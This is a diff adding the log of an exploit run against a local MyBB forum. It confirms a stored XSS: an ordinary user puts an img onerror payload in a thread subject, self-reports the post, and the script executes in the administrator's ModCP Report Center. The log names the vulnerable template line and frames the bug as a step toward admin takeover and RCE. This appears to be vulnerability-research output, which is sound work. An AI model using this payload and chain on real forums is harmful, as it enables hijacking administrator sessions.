@@ -1,0 +1,23 @@
+========================================================================
+VULN-001: Stored XSS in ModCP Report Center via thread subject
+Target: http://localhost:25850
+========================================================================
+[INFO] exercising modcp.php:471 -> modcp/reports/item.twig:11 trans() is_safe=html sink
+[SETUP] creating an ordinary user attacker_602d8bd4 (any member can do this; no mod rights)
+[INFO] attacker uid=8 logged in
+[STEP] posting a thread in fid=2 with subject = '<img src=x onerror="alert(document.domain);window.__xss=\'xssd0210c\'">'
+[INFO] the subject is the attacker-controlled sink; verify_subject() does NOT HTML-escape it
+[INFO] thread tid=2, first pid=2; subject stored in DB = '<img src=x onerror="alert(document.domain);window.__xss=\'xssd0210c\'">'
+[PROOF] payload persisted verbatim in mybb_threads.subject (stored, not sanitised)
+[STEP] self-reporting post pid=2 (report.php allows self-reports) so it enters the queue
+[INFO] reportedcontent rows for pid 2: 1
+[STEP] logging in as the administrator (uid 1, super admin) — the victim
+[STEP] admin opens modcp.php?action=reports (a routine moderation action)
+[INFO] admin Report Center HTTP 200; raw payload present=True; escaped=False
+[PROOF] the stored subject is rendered UNescaped inside the admin's report list (modcp/reports/item.twig:11 trans() is_safe=html) — attacker markup reaches the staff DOM
+[STEP] opening modcp.php?action=reports in real Chromium with the ADMIN cookie
+    DIALOG_FIRED msg="localhost" window.__xss="xssd0210c" marker="xssd0210c"
+[PROOF] Chromium executed the stored payload in the ADMIN's session — alert() fired (screenshot evidence/xss_fired.png). This is the user->admin->ACP->RCE entry point.
+------------------------------------------------------------------------
+[OK] exploit confirmed — stored subject executes JS in the administrator's Report Center
+==> VULN-001: CONFIRMED — stored XSS fires in admin ModCP (user->admin->RCE chain)
